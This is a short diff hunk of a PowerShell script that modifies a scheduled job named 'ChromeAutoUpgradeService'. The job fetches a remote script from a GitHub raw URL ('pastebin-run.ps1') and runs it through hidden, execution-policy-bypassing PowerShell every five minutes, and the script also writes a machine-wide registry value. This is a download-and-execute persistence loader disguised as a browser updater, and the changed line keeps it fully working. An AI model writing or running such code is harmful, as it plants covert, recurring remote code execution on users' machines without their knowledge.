@@ -2,7 +2,7 @@ Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\C
 $jobname = "ChromeAutoUpgradeService"
 $url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-run.ps1"
 $run = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
-$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command $run"
+$script = "powershell.exe -executionpolicy bypass -WindowStyle Hidden -command $run"
 $repeat = (New-TimeSpan -Minutes 5)
 $scriptblock = [scriptblock]::Create($script)
 $trigger = @(
